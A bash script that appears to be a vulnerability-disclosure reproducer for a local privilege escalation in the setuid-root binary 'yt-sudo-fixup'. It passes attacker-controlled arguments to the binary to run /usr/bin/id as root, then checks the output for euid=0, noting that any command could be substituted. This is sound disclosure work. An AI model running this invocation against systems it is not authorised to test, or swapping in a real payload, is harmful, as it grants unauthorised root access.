#!/usr/bin/env bash
# F01 — yt-sudo-fixup unauthenticated setuid LPE
# Non-weaponized reproducer for vendor verification.
# Runs /usr/bin/id only. Does not spawn a shell or modify the system.
set -u

BIN="${1:-/usr/local/bin/yt-sudo-fixup}"

if [[ ! -x "$BIN" ]]; then
    echo "[-] $BIN not found or not executable" >&2
    echo "    usage: $0 /path/to/yt-sudo-fixup" >&2
    exit 2
fi

PERMS=$(stat -c '%a %U' "$BIN" 2>/dev/null || stat -f '%Lp %Su' "$BIN")
echo "[*] target binary: $BIN"
echo "[*] permissions:   $PERMS"
echo "[*] expected:      4755 root  (setuid root) — required for the bug to be exploitable"
echo

if ! [[ -u "$BIN" ]]; then
    echo "[i] $BIN is NOT setuid-root in this environment."
    echo "    The bug only manifests when the binary is installed setuid-root."
    echo "    Source review of yt/yt/tools/yt_sudo_fixup/main.cpp:6-22 is sufficient"
    echo "    to confirm the issue."
    exit 0
fi

echo "[*] invoking: $BIN \$(id -u) /usr/bin/id"
echo "[*] benign payload — /usr/bin/id only, no shell, no file changes."
echo

OUT=$("$BIN" "$(id -u)" /usr/bin/id 2>&1) || true
echo "[id-output] $OUT"

if echo "$OUT" | grep -qE 'euid=0\(root\)|uid=0\(root\)'; then
    echo
    echo "[!] CONFIRMED: euid=0 reached via attacker-controlled argv."
    echo "    Any command can be substituted; this is a full local privilege"
    echo "    escalation. Mitigation: see fix.patch."
    exit 1
else
    echo
    echo "[i] euid=0 not observed. Either the binary is not setuid, or the"
    echo "    deployment has wrapped it. Inspect $PERMS."
    exit 0
fi
